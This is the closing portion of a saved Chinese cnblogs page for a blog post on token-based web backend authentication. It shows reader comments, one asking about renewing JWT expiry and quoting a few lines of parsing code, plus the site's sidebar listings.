				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3732098" class="layer">#28楼</a><a name="3732098" id="comment_anchor_3732098"></a>  <span class="comment_date">2017-07-10 17:33</span> <a id="a_comment_author_3732098" href="http://home.cnblogs.com/u/483548/" target="_blank">glbfor</a> <a href="http://msg.cnblogs.com/send/glbfor" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3732098" class="blog_comment_body"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3495959" title="查看所回复的评论" onclick="commentManager.renderComments(0,50,3495959);">@</a>
sadkilo<br>所以，使用UTC很重要。只要保持服务器有时间服务器就好了。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3732098,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3732098,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3736594" class="layer">#29楼</a><a name="3736594" id="comment_anchor_3736594"></a>  <span class="comment_date">2017-07-17 10:21</span> <a id="a_comment_author_3736594" href="http://home.cnblogs.com/u/1201223/" target="_blank">梁少少</a> <a href="http://msg.cnblogs.com/send/%E6%A2%81%E5%B0%91%E5%B0%91" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3736594" class="blog_comment_body">楼主，这个Date exp = new Date(expMillis);<br>    builder.setExpiration(exp);过期时间可以累加么，就是下次访问的时候，过期时间要重新设置累加！怎么弄呢？<br>现在时间一到期，Claims claims = Jwts.parser()        <br>.setSigningKey(DatatypeConverter.parseBase64Binary(apiKey.getSecret()))<br>   .parseClaimsJws(jwt).getBody();<br>这一段解析就报错。。。<br>还有，怎么进行token的判断是否有效或者无效，是否过期？</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3736594,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3736594,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3750969" class="layer">#30楼</a><a name="3750969" id="comment_anchor_3750969"></a><span id="comment-maxId" style="display:none;">3750969</span><span id="comment-maxDate" style="display:none;">2017/8/5 0:26:27</span>  <span class="comment_date">2017-08-05 00:26</span> <a id="a_comment_author_3750969" href="http://www.cnblogs.com/tearer/" target="_blank">井中驴</a> <a href="http://msg.cnblogs.com/send/%E4%BA%95%E4%B8%AD%E9%A9%B4" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3750969" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3750969,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3750969,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3750969_avatar" style="display:none;">http://pic.cnblogs.com/face/u33315.jpg</span>
			</div>
		</div>
	<div id="comments_pager_bottom"></div></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div id="comment_form" class="commentform">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#" onclick="return RefreshPage();">刷新页面</a><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#top">返回顶部</a></div>
<div id="comment_form_container"><div class="login_tips">注册用户登录后才能发表评论，请 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login(&#39;commentform&#39;);">登录</a> 或 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，<a href="http://www.cnblogs.com/">访问</a>网站首页。</div></div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank">【推荐】50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库</a><br><a href="https://www.jiguang.cn/devservice?bky" target="_blank">【推荐】极光开发者服务平台，五大功能一站集齐</a><br><a href="http://click.aliyun.com/m/18488/" target="_blank">【推荐】阿里云“全民云计算”优惠升级</a><br><a href="https://cloud.tencent.com/developer/labs?fromSource=gwzcw.330910.330910.330910" target="_blank">【推荐】一小时搭建人工智能应用，让技术更容易入门</a><br></div>
<div id="opt_under_post"></div>
<div id="cnblogs_c1" class="c_ad_block"><a href="http://click.aliyun.com/m/26126/" target="_blank"><img width="300" height="250" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/24442-20170718132533661-166801094.jpg" alt="阿里云0718"></a></div>
<div id="under_post_news"><div class="itnews c_ad_block"><b>最新IT新闻</b>:<br> ·  <a href="http://news.cnblogs.com/n/575415/" target="_blank">腾讯AI Lab孙钟前：如何用AI技术做食管癌识别和辅助诊断</a><br> ·  <a href="http://news.cnblogs.com/n/575418/" target="_blank">NASA征集“纪念旅行者1号40周年”短讯：将于9月5号发向太空</a><br> ·  <a href="http://news.cnblogs.com/n/575417/" target="_blank">华为进军美国道路铺平 能否打败苹果让国人沸腾？</a><br> ·  <a href="http://news.cnblogs.com/n/575416/" target="_blank">京津冀高铁首次演示超高速Wi-Fi技术，平均传输带宽可达150Mbps</a><br> ·  <a href="http://news.cnblogs.com/n/575414/" target="_blank">不成熟的自动驾驶系统反而推高了事故率 保险业不愿意了</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div></div>
<div id="cnblogs_c2" class="c_ad_block"><a href="https://www.jiguang.cn/devservice?source=bky&amp;hmsr=%E5%8D%9A%E5%AE%A2%E5%9B%AD&amp;hmpl=&amp;hmcu=&amp;hmkw=&amp;hmci=" target="_blank"><img width="468" height="60" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/24442-20170629165247758-2056260207.png" alt="极光推广_0701"></a></div>
<div id="under_post_kb"><div class="itnews c_ad_block" id="kb_block"><b>最新知识库文章</b>:<br><div id="kb_recent"> ·  <a href="http://kb.cnblogs.com/page/574767/" target="_blank">编写Shell脚本的最佳实践</a><br> ·  <a href="http://kb.cnblogs.com/page/571915/" target="_blank">为什么你该开始学习编程了？</a><br> ·  <a href="http://kb.cnblogs.com/page/570194/" target="_blank">小printf的故事：什么是真正的程序员？</a><br> ·  <a href="http://kb.cnblogs.com/page/569992/" target="_blank">程序员的工作、学习与绩效</a><br> ·  <a href="http://kb.cnblogs.com/page/569056/" target="_blank">软件开发为什么很难</a><br></div>» <a href="http://kb.cnblogs.com/" target="_blank">更多知识库文章...</a></div></div>
<div id="HistoryToday" class="c_ad_block"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>


	</div><!--end: forFlow -->
	</div><!--end: mainContent 主体内容容器-->

	<div id="sideBar">
		<div id="sideBarMain">
			
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
	<div id="blog-news"><p>
<img border="0" alt="" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/a34831.jpg">
<br>
</p>
这个世界并不会在意你的自尊，<br>
而是要求你在自我感觉良好之前先有所成就<br>
<p>新浪微博：<a href="http://weibo.com/xiekeli">@红心李</a></p>
<p>不堪回首：<a href="http://blog.163.com/xieke_li">@Junotes</a></p>
<p>&nbsp;</p>
<p>
</p><div style=""><table cellspacing="0" cellpadding="4" style="&gt;&lt;tr align=" center"=""><tbody><tr><td style=""><a href="https://book.douban.com/subject/25911978/" title="知行合一王阳明（1472—1529）

" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s27311101.jpg" border="0"></a></td><td style=""><a href="https://book.douban.com/subject/26702824/" title="分布式服务框架：原理与实践

" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s28378000.jpg" border="0"></a></td></tr><tr align="center"><td style=""><a href="https://book.douban.com/subject/26881947/" title="轻量级微服务架构（上册）

" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s29066325.jpg" border="0"></a></td><td style=""><a href="https://book.douban.com/subject/10945606/" title="精益创业

The Lean Startup" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s11137256.jpg" border="0"></a></td></tr><tr align="center"><td style=""><a href="https://book.douban.com/subject/10546925/" title="白帽子讲Web安全

" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s8977570.jpg" border="0"></a></td><td style=""><a href="https://book.douban.com/subject/4241826/" title="高性能MySQL（第二版）

High Performance MySQL, 2nd Edition" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/s4141593.jpg" border="0"></a></td></tr><tr><td align="center" colspan="2"><a href="http://www.douban.com/people/xiekeli/" target="_blank">我的豆瓣主页</a></td></tr><tr><td align="center" colspan="2"><a href="http://www.douban.com/" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/atdouban.gif" border="0"></a></td></tr></tbody></table></div><p></p>
<div style="display: none" id="__document_write_ajax_div-2"></div><noscript>&lt;a href="http://www.linezing.com"&gt;&lt;img src="http://img.tongji.linezing.com/2739142/tongji.gif" alt="" /&gt;&lt;/a&gt;</noscript>
<div id="clustrmaps-widget"></div>
<div style="display: none" id="__document_write_ajax_div-3"></div><noscript>&lt;a href="http://www3.clustrmaps.com/user/442ed86d"&gt;&lt;img src="http://www3.clustrmaps.com/stats/maps-no_clusters/www.cnblogs.com-xiekeli--thumb.jpg" alt="Locations of visitors to this page" /&gt;&lt;/a&gt;</noscript><div id="profile_block">昵称：<a href="http://home.cnblogs.com/u/xiekeli/">红心李</a><br>园龄：<a href="http://home.cnblogs.com/u/xiekeli/" title="入园时间：2008-06-05">9年2个月</a><br>粉丝：<a href="http://home.cnblogs.com/u/xiekeli/followers/">150</a><br>关注：<a href="http://home.cnblogs.com/u/xiekeli/followees/">4</a><div id="p_b_follow"></div><div style="display: none" id="__document_write_ajax_div-4"></div></div></div><script type="text/javascript">loadBlogNews();</script>
</div>

			<div id="blog-calendar" style=""><table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar">
	<tbody><tr><td colspan="7"><table class="CalTitle" cellspacing="0">
		<tbody><tr><td class="CalNextPrev"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2017/07/01&#39;);return false;">&lt;</a></td><td align="center">2017年8月</td><td class="CalNextPrev" align="right"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2017/09/01&#39;);return false;">&gt;</a></td></tr>
	</tbody></table></td></tr><tr><th class="CalDayHeader" align="center" abbr="日" scope="col">日</th><th class="CalDayHeader" align="center" abbr="一" scope="col">一</th><th class="CalDayHeader" align="center" abbr="二" scope="col">二</th><th class="CalDayHeader" align="center" abbr="三" scope="col">三</th><th class="CalDayHeader" align="center" abbr="四" scope="col">四</th><th class="CalDayHeader" align="center" abbr="五" scope="col">五</th><th class="CalDayHeader" align="center" abbr="六" scope="col">六</th></tr><tr><td class="CalOtherMonthDay" align="center">30</td><td class="CalOtherMonthDay" align="center">31</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td class="CalWeekendDay" align="center">5</td></tr><tr><td class="CalWeekendDay" align="center">6</td><td class="CalTodayDay" align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td class="CalWeekendDay" align="center">12</td></tr><tr><td class="CalWeekendDay" align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td align="center">18</td><td class="CalWeekendDay" align="center">19</td></tr><tr><td class="CalWeekendDay" align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td align="center">25</td><td class="CalWeekendDay" align="center">26</td></tr><tr><td class="CalWeekendDay" align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">31</td><td class="CalOtherMonthDay" align="center">1</td><td class="CalOtherMonthDay" align="center">2</td></tr><tr><td class="CalOtherMonthDay" align="center">3</td><td class="CalOtherMonthDay" align="center">4</td><td class="CalOtherMonthDay" align="center">5</td><td class="CalOtherMonthDay" align="center">6</td><td class="CalOtherMonthDay" align="center">7</td><td class="CalOtherMonthDay" align="center">8</td><td class="CalOtherMonthDay" align="center">9</td></tr>
</tbody></table></div><script type="text/javascript">loadBlogDefaultCalendar();</script>
			
			<div id="leftcontentcontainer">
				<div id="blog-sidecolumn"><div id="sidebar_search" class="sidebar-block">
<div id="sidebar_search" class="mySearch">
<h3 class="catListTitle">搜索</h3>
<div id="sidebar_search_box">
<div id="widget_my_zzk" class="div_my_zzk"><input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk"></div>
<div id="widget_my_google" class="div_my_zzk"><input type="text" name="google_q" id="google_q" onkeydown="return google_go_enter(event)" class="input_my_zzk">&nbsp;<input onclick="google_go()" type="button" value="谷歌搜索" class="btn_my_zzk"></div>
</div>
</div>

</div><div id="sidebar_shortcut" class="sidebar-block">
<div class="catListLink">
<h3 class="catListTitle">常用链接</h3>
<ul>
<li><a href="http://www.cnblogs.com/xiekeli/p/" title="我的博客的随笔列表">我的随笔</a></li><li><a href="http://www.cnblogs.com/xiekeli/MyComments.html" title="我发表过的评论列表">我的评论</a></li><li><a href="http://www.cnblogs.com/xiekeli/OtherPosts.html" title="我评论过的随笔列表">我的参与</a></li><li><a href="http://www.cnblogs.com/xiekeli/RecentComments.html" title="我的博客的评论列表">最新评论</a></li><li><a href="http://www.cnblogs.com/xiekeli/tag/" title="我的博客的标签列表">我的标签</a></li>
</ul>
<div id="itemListLin_con" style="display:none;">
<ul>

</ul>
</div>
</div></div><div id="sidebar_toptags" class="sidebar-block">
<div class="catListTag">
<h3 class="catListTitle">我的标签</h3>
<ul>
<li><a href="http://www.cnblogs.com/xiekeli/tag/MINA/">MINA</a>(3)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/Instagram%E6%9E%B6%E6%9E%84/">Instagram架构</a>(3)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/%E5%93%88%E5%B8%8C%E8%A1%A8/">哈希表</a>(2)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%20%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/">进程通信 内存映射</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/%E5%86%85%E5%AD%98%E6%B1%A0/">内存池</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/">图像处理</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/linux%20sar/">linux sar</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/log4net/">log4net</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/Nginx/">Nginx</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/Programming%20in%20Objective-C/">Programming in Objective-C</a>(1)</li><li><a href="http://www.cnblogs.com/xiekeli/tag/">更多</a></li>
</ul>
</div></div><div id="sidebar_categories">
<div id="sidebar_postcategory" class="catListPostCategory sidebar-block">
<h3 class="catListTitle">随笔分类<span style="font-size:11px;font-weight:normal">(41)</span></h3>

<ul>

<li><a id="CatList_LinkList_0_Link_0" href="http://www.cnblogs.com/xiekeli/category/706437.html">.NET(3)</a> </li>

<li><a id="CatList_LinkList_0_Link_1" href="http://www.cnblogs.com/xiekeli/category/348820.html">algorithm(3)</a> </li>

<li><a id="CatList_LinkList_0_Link_2" href="http://www.cnblogs.com/xiekeli/category/343127.html">Architecture(4)</a> </li>

<li><a id="CatList_LinkList_0_Link_3" href="http://www.cnblogs.com/xiekeli/category/343126.html">C_C++(7)</a> </li>

<li><a id="CatList_LinkList_0_Link_4" href="http://www.cnblogs.com/xiekeli/category/816537.html">DB(1)</a> </li>

<li><a id="CatList_LinkList_0_Link_5" href="http://www.cnblogs.com/xiekeli/category/378834.html">image processing(1)</a> </li>

<li><a id="CatList_LinkList_0_Link_6" href="http://www.cnblogs.com/xiekeli/category/343128.html">iOS Develop(1)</a> </li>

<li><a id="CatList_LinkList_0_Link_7" href="http://www.cnblogs.com/xiekeli/category/411569.html">Java(3)</a> </li>

<li><a id="CatList_LinkList_0_Link_8" href="http://www.cnblogs.com/xiekeli/category/348819.html">linux(4)</a> </li>

<li><a id="CatList_LinkList_0_Link_9" href="http://www.cnblogs.com/xiekeli/category/376057.html">Python(2)</a> </li>

<li><a id="CatList_LinkList_0_Link_10" href="http://www.cnblogs.com/xiekeli/category/346593.html">Thinking(1)</a> </li>

<li><a id="CatList_LinkList_0_Link_11" href="http://www.cnblogs.com/xiekeli/category/343129.html">Web(8)</a> </li>

<li><a id="CatList_LinkList_0_Link_12" href="http://www.cnblogs.com/xiekeli/category/733579.html">编程语言</a> </li>

<li><a id="CatList_LinkList_0_Link_13" href="http://www.cnblogs.com/xiekeli/category/375520.html">互联网观察(3)</a> </li>

</ul>

</div>

<div id="sidebar_postarchive" class="catListPostArchive sidebar-block">
<h3 class="catListTitle">随笔档案<span style="font-size:11px;font-weight:normal">(35)</span></h3>

<ul>

<li><a id="CatList_LinkList_1_Link_0" href="http://www.cnblogs.com/xiekeli/archive/2016/06.html">2016年6月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_1" href="http://www.cnblogs.com/xiekeli/archive/2016/04.html">2016年4月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_2" href="http://www.cnblogs.com/xiekeli/archive/2015/07.html">2015年7月 (2)</a> </li>

<li><a id="CatList_LinkList_1_Link_3" href="http://www.cnblogs.com/xiekeli/archive/2015/06.html">2015年6月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_4" href="http://www.cnblogs.com/xiekeli/archive/2014/10.html">2014年10月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_5" href="http://www.cnblogs.com/xiekeli/archive/2014/09.html">2014年9月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_6" href="http://www.cnblogs.com/xiekeli/archive/2014/08.html">2014年8月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_7" href="http://www.cnblogs.com/xiekeli/archive/2012/11.html">2012年11月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_8" href="http://www.cnblogs.com/xiekeli/archive/2012/10.html">2012年10月 (2)</a> </li>

<li><a id="CatList_LinkList_1_Link_9" href="http://www.cnblogs.com/xiekeli/archive/2012/09.html">2012年9月 (1)</a> </li>

<li><a id="CatList_LinkList_1_Link_10" href="http://www.cnblogs.com/xiekeli/archive/2012/08.html">2012年8月 (3)</a> </li>

<li><a id="CatList_LinkList_1_Link_11" href="http://www.cnblogs.com/xiekeli/archive/2012/07.html">2012年7月 (2)</a> </li>

<li><a id="CatList_LinkList_1_Link_12" href="http://www.cnblogs.com/xiekeli/archive/2012/05.html">2012年5月 (4)</a> </li>

<li><a id="CatList_LinkList_1_Link_13" href="http://www.cnblogs.com/xiekeli/archive/2012/04.html">2012年4月 (7)</a> </li>

<li><a id="CatList_LinkList_1_Link_14" href="http://www.cnblogs.com/xiekeli/archive/2012/02.html">2012年2月 (2)</a> </li>

<li><a id="CatList_LinkList_1_Link_15" href="http://www.cnblogs.com/xiekeli/archive/2012/01.html">2012年1月 (4)</a> </li>

<li><a id="CatList_LinkList_1_Link_16" href="http://www.cnblogs.com/xiekeli/archive/2011/12.html">2011年12月 (1)</a> </li>

</ul>

</div>

</div><div id="sidebar_scorerank" class="sidebar-block">
<div class="catListBlogRank">
<h3 class="catListTitle">积分与排名</h3>
<ul>
	<li class="liScore">
		积分 -	83097
	</li>
	<li class="liRank">
		排名 -	3344
	</li>
</ul>
</div>


</div><div id="sidebar_recentcomments" class="sidebar-block"><div id="recent_comments_wrap">
<div class="catListComment">
<h3 class="catListTitle">最新评论</h3>

	<div id="RecentCommentsBlock"><ul>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3750969">1. Re:基于Token的WEB后台认证机制</a></li>
        <li class="recent_comment_body">mark</li>
        <li class="recent_comment_author">--井中驴</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/xiekeli/archive/2012/01/13/2321207.html#3741856">2. Re:哈希表的C实现（一）</a></li>
        <li class="recent_comment_body">char* names[]={"name","address","phone","k101","k110"};117 char* descs[]={"Sourav","Sinagor","26......</li>
        <li class="recent_comment_author">--WangHello</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3736594">3. Re:基于Token的WEB后台认证机制</a></li>
        <li class="recent_comment_body">楼主，这个Date exp = new Date(expMillis); builder.setExpiration(exp);过期时间可以累加么，就是下次访问的时候，过期时间要重新设置累加！怎......</li>
        <li class="recent_comment_author">--梁少少</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3732098">4. Re:基于Token的WEB后台认证机制</a></li>
        <li class="recent_comment_body">@sadkilo所以，使用UTC很重要。只要保持服务器有时间服务器就好了。...</li>
        <li class="recent_comment_author">--glbfor</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3732096">5. Re:基于Token的WEB后台认证机制</a></li>
        <li class="recent_comment_body">@长风之子1.使用redis共享session。2.服务端设为支持多个域。3.自定义sessionid生成读取。 不使用容器session机制。4.同时支持cookie或url参数作为token载体。......</li>
        <li class="recent_comment_author">--glbfor</li>
</ul>
</div>
</div>
</div></div><div id="sidebar_topviewedposts" class="sidebar-block"><div id="topview_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">阅读排行榜</h3>
	<div id="TopViewPostsBlock"><ul><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/08/13/2637176.html">1. Gvim开发环境配置笔记--Windows篇(94312)</a></li><li><a href="http://www.cnblogs.com/xiekeli/p/5607107.html">2. 基于Token的WEB后台认证机制(84056)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/01/13/2321207.html">3. 哈希表的C实现（一）(21569)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/27/2474230.html">4. CentOS搭建python开发环境(19733)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/29/2476197.html">5. Linux命令扫盲 之 sar(15884)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/10/17/2727432.html">6. nginx源码学习----内存池(15488)</a></li><li><a href="http://www.cnblogs.com/xiekeli/p/4018579.html">7. Windows进程通信 -- 共享内存（1）(12273)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/11/02/2750991.html">8. Mina框架研究（3）(11465)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/09/06/2674199.html">9. Mina框架研究（1）(11271)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/01/17/2324433.html">10. 哈希表的C实现（三）---传说中的暴雪版(8336)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topcommentedposts" class="sidebar-block"><div id="topfeedback_posts_wrap">
<div class="catListFeedback">
<h3 class="catListTitle">评论排行榜</h3>
	<div id="TopFeedbackPostsBlock"><ul><li><a href="http://www.cnblogs.com/xiekeli/p/5607107.html">1. 基于Token的WEB后台认证机制(30)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/08/13/2637176.html">2. Gvim开发环境配置笔记--Windows篇(19)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/05/09/2491191.html">3. 图像处理学习之路 -- 认识BMP(10)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/27/2473808.html">4. Quora的技术探索(9)</a></li><li><a href="http://www.cnblogs.com/xiekeli/p/4018579.html">5. Windows进程通信 -- 共享内存（1）(9)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/01/17/2324433.html">6. 哈希表的C实现（三）---传说中的暴雪版(7)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/10/17/2727432.html">7. nginx源码学习----内存池(6)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/11/02/2750991.html">8. Mina框架研究（3）(5)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/25/2470530.html">9. 认识http协议(一)(4)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/02/22/2363281.html">10. 你真的会使用assert吗？(4)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topdiggedposts" class="sidebar-block"><div id="topdigg_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">推荐排行榜</h3>
<div id="TopDiggPostsBlock"><ul><li><a href="http://www.cnblogs.com/xiekeli/p/5607107.html">1. 基于Token的WEB后台认证机制(85)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/08/13/2637176.html">2. Gvim开发环境配置笔记--Windows篇(25)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/27/2473808.html">3. Quora的技术探索(16)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/05/09/2491191.html">4. 图像处理学习之路 -- 认识BMP(14)</a></li><li><a href="http://www.cnblogs.com/xiekeli/p/4611113.html">5. Log4Net指南(6)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/10/17/2727432.html">6. nginx源码学习----内存池(6)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/27/2474230.html">7. CentOS搭建python开发环境(5)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/05/28/2520770.html">8. Instagram的技术探索(2)(4)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/05/23/2514108.html">9. Instagram的技术探索(4)</a></li><li><a href="http://www.cnblogs.com/xiekeli/archive/2012/04/25/2470530.html">10. 认识http协议(一)(4)</a></li></ul></div>
</div></div></div></div><script type="text/javascript">loadBlogSideColumn();</script>
			</div>
			
		</div><!--end: sideBarMain -->
	</div><!--end: sideBar 侧边栏容器 -->
	<div class="clear"></div>
	</div><!--end: main -->
	<div class="clear"></div>
	<div id="footer">
		
<!--done-->
Copyright ©2017 红心李
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->


</body></html>